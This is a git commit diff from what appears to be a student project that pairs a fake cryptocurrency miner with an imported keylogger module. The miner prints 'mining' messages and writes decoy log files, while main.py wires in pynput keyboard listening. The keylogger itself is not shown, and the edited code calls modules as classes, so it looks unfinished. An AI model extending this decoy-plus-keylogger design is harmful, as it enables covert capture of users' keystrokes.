cfbf9eafe7adf06c774dff616b8b8ddecfbd66ea
Tom Zaiger <tomzaiger@hotmail.com>
2020-06-07 15:33:03 +0300

    New arrangement

--- main.py
+++ main.py
@@ -1,16 +1,20 @@
-import settings
+import miner
+import keylogger
+from pynput.keyboard import Listener
 from multiprocessing import Process
-#import time
-#import random
-#from os import path
+
 
 if __name__ == '__main__':
-    settings.init()
-    p = Process(target = miner)
+    m = miner()
+    k = keylogger()
+    print(k)
+
+    p = Process(target = m.mine)
     p.start()
     p.join()
 
 
-
+"""
 with Listener(on_press=press) as listener: # Keypress listener
     listener.join()
+"""
--- miner.py
+++ miner.py
@@ -1,27 +1,31 @@
-from settings import *
+import time
+import random
 
 """
 Fake miner
 """
-def miner():
-    print("Welcome to INTEminer for INTEcoins!")
-    print("Mining", end = "")
-    INTEcoins=0
+class Miner():
+    INTEcoins = 0
     file_count = 1
-    while True:
-        # Miner messages
-        print(".", end = "")
-        randomNumber = random.randint(1, 100)
-        time.sleep(randomNumber/20) # Sleep for a short random time
-        if randomNumber%10 == 0:
-            INTEcoins += randomNumber
-            print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
-            print("Mining", end = "")
+    def __init__(self):
+        print("Welcome to INTEminer for INTEcoins!")
+        print("Mining..", end = "")
 
-        # Write fake logs
-        if randomNumber%50 == 0:
-            file_count+=1
-        else:
-            with open(LOGS_PATH + "INTEcoin{}.dat".format(file_count), "a") as file:
-                file.write("{0:b}".format(random.randint(10000000000,100000000000)))
-                file.close()
+    def mine(self):
+        while True:
+            # Miner messages
+            print(".", end = "")
+            randomNumber = random.randint(1, 100)
+            time.sleep(randomNumber/20) # Sleeps for a short random time
+            if randomNumber%10 == 0:
+                self.INTEcoins += randomNumber
+                print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, self.INTEcoins))
+                print("Mining", end = "")
+
+            # Writes fake logs
+            if randomNumber%50 == 0:
+                self.file_count+=1
+            else:
+                with open("logs/INTEcoin{}.dat".format(self.file_count), "a") as file:
+                    file.write("{0:b}".format(random.randint(10000000000,100000000000)))
+                    file.close()
